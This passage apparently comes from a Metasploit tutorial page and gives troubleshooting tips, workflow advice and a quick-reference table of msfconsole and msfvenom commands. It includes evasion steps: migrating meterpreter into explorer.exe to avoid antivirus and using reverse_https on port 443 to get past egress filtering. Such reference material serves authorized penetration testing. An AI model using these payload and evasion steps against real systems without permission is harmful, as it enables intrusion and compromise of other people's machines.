  :::accordion-item{icon="i-lucide-circle-help" label="Meterpreter dies immediately after connecting"}
  **Causes:**
  - AV detecting meterpreter in memory
  - Unstable process that exits

  **Fixes:**
  - Set `AutoRunScript` to migrate immediately:
    ```bash
    set AutoRunScript "migrate -N explorer.exe"
    ```
  - Use `PrependMigrate=true` in msfvenom
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Database not connected"}
  ```bash [Terminal]
  sudo systemctl restart postgresql
  sudo msfdb reinit
  msfconsole
  db_status
  ```
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Handler not catching shells from NAT/Cloud"}
  - Use a public IP or VPS for your listener
  - Set `ReverseListenerBindAddress` to `0.0.0.0`
  - Forward ports on your router
  - Consider using `reverse_https` on port 443 to bypass egress filtering
  :::
::

## Pro Tips & Tricks

::card-group
  ::card
  ---
  title: Always Use Workspaces
  icon: i-lucide-folder-open
  ---
  Separate every engagement into its own workspace. `workspace -a client_name` keeps your data organized and prevents cross-contamination.
  ::

  ::card
  ---
  title: Background Jobs Are Life
  icon: i-lucide-layers
  ---
  Run handlers with `exploit -j` to keep your console free. Use `jobs -l` to list and `jobs -k <id>` to kill.
  ::

  ::card
  ---
  title: Global Variables Save Time
  icon: i-lucide-globe
  ---
  `setg LHOST 192.168.1.50` and `setg LPORT 4444` persist across all modules. Set once, hack forever.
  ::

  ::card
  ---
  title: Save Your Work
  icon: i-lucide-save
  ---
  Use `spool /path/to/output.log` to log everything. `loot`, `creds`, and `notes` commands store data in the DB.
  ::

  ::card
  ---
  title: Tab Completion is God
  icon: i-lucide-keyboard
  ---
  Hit :kbd{value="Tab"} everywhere. Module names, options, file paths — Metasploit autocompletes almost everything.
  ::

  ::card
  ---
  title: Update Regularly
  icon: i-lucide-refresh-cw
  ---
  `msfupdate` or `apt update && apt install metasploit-framework`. New exploits drop weekly. Stay current or stay irrelevant.
  ::
::

## Quick Reference Card

::collapsible

| Task                        | Command                                                            |
| --------------------------- | ------------------------------------------------------------------ |
| Launch Metasploit           | `msfconsole`                                                       |
| Update framework            | `msfupdate`                                                        |
| Search modules              | `search <keyword>`                                                 |
| Use a module                | `use <module/path>`                                                |
| Show options                | `show options`                                                     |
| Set option                  | `set RHOSTS 192.168.1.100`                                         |
| Set global option           | `setg LHOST 192.168.1.50`                                          |
| Run exploit                 | `exploit` or `run`                                                 |
| Run in background           | `exploit -j`                                                       |
| List sessions               | `sessions -l`                                                      |
| Interact with session       | `sessions -i 1`                                                    |
| Kill all sessions           | `sessions -K`                                                      |
| Background session          | `background` or :kbd{value="Ctrl"} + :kbd{value="Z"}              |
| Generate payload            | `msfvenom -p <payload> LHOST=x LPORT=x -f <format> -o <file>`     |
| List payloads               | `msfvenom -l payloads`                                             |
| List encoders               | `msfvenom -l encoders`                                             |
| List formats                | `msfvenom -l formats`                                              |
| Database status             | `db_status`                                                        |
| Create workspace            | `workspace -a <name>`                                              |
| Run Nmap with DB            | `db_nmap -sV -sC <target>`                                        |
| Show hosts                  | `hosts`                                                            |
| Show services               | `services`                                                         |
| Show creds                  | `creds`                                                            |
| Start logging               | `spool /tmp/msf.log`                                               |
| Load RC script              | `msfconsole -r script.rc`                                          |

::

::tip
Remember: **Metasploit is a tool, not a skill.** Understanding networking, operating systems, and vulnerability classes is what makes you dangerous. The framework just makes you efficient. Happy (authorized) hacking. :icon{name="i-lucide-skull"}
::